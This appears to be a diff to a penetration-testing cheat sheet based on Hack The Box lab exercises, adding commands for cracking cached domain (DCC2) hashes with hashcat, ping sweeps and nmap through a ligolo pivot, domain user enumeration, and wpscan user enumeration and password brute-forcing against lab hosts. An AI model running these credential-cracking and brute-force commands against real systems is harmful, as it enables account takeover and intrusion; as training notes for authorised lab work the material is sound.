@@ -664,7 +664,16 @@ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
 hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
 
 # Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
-office2john.py Protected.docx > protected-docx.hash  
+office2john.py Protected.docx > protected-docx.hash
+
+# Cracking DCC2 hashes (when dump by secretsdump)
+[*] Dumping cached domain logon information (domain/username:hash)
+INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc
+
+hashcat -m 2100 '$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc' /usr/share/wordlists/rockyou.txt
+
+# Dumping  DPAPI
+read path : https://academy.hackthebox.com/module/147/section/1315
 ```
 ## Windows Lateral Movement Techniques
 
@@ -1204,12 +1213,16 @@ listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601       ( run in proxy)
 # setting to Access the Agent's own Localhost.
 sudo ip route add 240.0.0.1/32 dev1 ligolo                   ( run in hacer shell)
 
-# Command need to run  , ping , fping and nmap in pivot 
+# Command need to run  , ping , fping and nmap in pivot or using static nmap binary
 for i in {1..254}; do ping -c 1 -W 1 172.16.5.$i | grep "from" & done
+
+for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
 
 fping -asgq 172.16.5.0/24
 
 nmap -sT -Pn --unprivileged --send-eth 172.16.6.45
+
+https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
 
 # Get infor of ligolo
 ip route show dev ligolo
@@ -1730,6 +1743,8 @@ net user /domain
 
 # Get detailed information for a specific domain user
 net user <username> /domain
+or
+net user hporter /dom
 
 # List all groups in the current domain
 net group /domain
@@ -2806,8 +2821,14 @@ cat web_discovery.xml | ./aquatone -nmap
 sudo gem install wpscan
 https://wpvulndb.com/ ( to get api and using with --api-token parameter )
 
-# Runs wpscan using the --enmuerate flag and --api-token parameter 
+# Runs wpscan using the --enmuerate flag and --api-token parameter  and ap is all flag to enumerate all plugins
 sudo wpscan --url http://blog.inlanefreight.local --enumerate ap --api-token dEOFB<SNIP>
+
+# Runs wpscan using the flag u to list user
+sudo wpscan -e u -t 500 --url http://ir.inlanefreight.local
+
+# Runs wpscan to brute using list pass (https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/darkweb2017_top-100.txt)
+sudo wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp
 
 # Runs wpscan and uses it to perform a password attack (--password-attack) with xmlrpc method 
 sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
